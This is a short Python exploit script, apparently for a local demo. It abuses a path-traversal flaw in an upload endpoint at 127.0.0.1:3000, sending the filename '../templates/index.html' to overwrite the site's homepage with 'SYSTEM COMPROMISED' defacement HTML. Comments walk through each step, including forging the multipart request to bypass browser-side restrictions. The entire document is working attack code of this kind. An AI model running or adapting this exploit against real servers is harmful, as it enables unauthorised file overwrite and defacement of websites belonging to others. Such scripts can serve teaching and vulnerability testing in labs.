# exploit.py
import requests

# The URL of the vulnerable upload endpoint
URL = 'http://127.0.0.1:3000/upload'

# The Malicious Payload:
# 1. We use '../' to break out of the target 'uploads' directory.
# 2. We navigate into the 'templates' directory.
# 3. We target 'index.html' to overwrite the core homepage.
malicious_filename = '../templates/index.html'

# The code we want to inject into the server
defacement_html = """
<body style="background: black; color: #10b981; text-align: center; font-family: monospace; padding-top: 100px;">
    <h1>[ SYSTEM COMPROMISED ]</h1>
    <p>This server has been taken over via Path Traversal!</p>
</body>
"""

print("[*] Initiating Path Traversal Attack...")
print(f"[*] Target: {URL}")
print(f"[*] Payload Filename: {malicious_filename}")

try:
    # We forge the multipart form-data request, bypassing any browser UI restrictions.
    files = {'file': (malicious_filename, defacement_html, 'text/html')}
    response = requests.post(URL, files=files)

    print(f"\n[+] Server responded with status code: {response.status_code}")
    print("[+] Attack complete! Refresh your browser's homepage to view the damage.")
except Exception as e:
    print(f"[-] Connection failed: {e}")
